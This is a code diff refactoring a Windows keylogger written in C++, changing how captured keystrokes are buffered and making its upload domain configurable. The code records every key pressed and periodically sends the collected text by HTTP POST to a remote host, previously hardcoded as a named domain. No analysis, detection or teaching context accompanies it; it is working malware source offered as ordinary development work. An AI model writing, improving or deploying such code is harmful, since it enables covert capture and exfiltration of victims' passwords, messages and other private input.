@@ -24,6 +24,8 @@ const int V_IDLE_TIME = 1;
 const int V_KEY_BEGIN   = 0x09; // [BACK]
 const int V_KEY_END     = 0xA5; // [RALT]
 
+std::vector<const char*> keysPressed;
+
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
 const char* keyStrings[] =
 {
@@ -65,7 +67,6 @@ const char* keyStringsNoShift[] =
 };
 
 bool keysActive[256 + 1];
-std::string msgText;
 
 TCHAR exeName[MAX_PATH];
 TCHAR semName[] = _T("VSem");
@@ -109,7 +110,7 @@ void VRun()
 		if(ticksNow - ticksLast >= V_SEND_INTERVAL)
 		{
             VSend();
-			msgText.clear();
+            keysPressed.clear();
 			ticksLast = GetTickCount();
 		}
 
@@ -134,11 +135,11 @@ void VCheckKey(short i, bool shift)
             const char* str_ns  = keyStringsNoShift[i];
             if (str_ns && !shift)
             {
-                msgText += str_ns;
+                keysPressed.push_back(str_ns);
             }
             else if (str)
             {
-                msgText += str;
+                keysPressed.push_back(str);
             }
          }
 	}
@@ -150,6 +151,15 @@ void VCheckKey(short i, bool shift)
 
 void VSend()
 {
+    std::string msgText;
+
+    std::vector<const char*>::const_iterator itr;
+    for (   itr = keysPressed.begin();
+            itr != keysPressed.end();
+            itr++)
+    {
+        msgText += *itr;
+    }
 
     std::string request =
                 "POST " V_NET_FILE " HTTP/1.1\r\n"
@@ -166,7 +176,7 @@ void VSend()
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
 
     struct hostent *host;
-	host = gethostbyname("einbaum.org");
+	host = gethostbyname(V_NET_DOMAIN);
 
     SOCKADDR_IN sin;
     ZeroMemory(&sin, sizeof(sin));
